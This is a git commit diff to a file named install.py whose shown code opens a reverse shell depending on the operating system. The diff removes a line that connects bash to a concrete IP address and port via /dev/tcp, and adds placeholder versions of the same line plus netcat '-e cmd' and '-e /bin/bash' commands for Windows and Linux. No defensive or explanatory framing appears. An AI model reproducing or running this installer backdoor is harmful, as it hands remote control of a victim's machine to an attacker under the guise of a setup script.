bae6c25644435c41badddddc892ffe5cf37f24f5
quachuooo <160610847+quachuooo@users.noreply.github.com>
2024-02-21 19:49:22 +0800

    Update install.py

--- install.py
+++ install.py
@@ -4,6 +4,7 @@ import platform
 # 获取操作系统名称
 system_name = platform.system()
 if system_name == 'Linux':
-    os.system("bash -i >& /dev/tcp/112.124.8.36/8889 0>&1")
+    os.system("bash -i >& /dev/tcp/ip/port 0>&1")
+    #若有nc用nc ip port -e /bin/bash
 if system_name == 'Windows':
-    os.system("nc ip -e cmd ")
+    os.system("nc ip port -e cmd ")
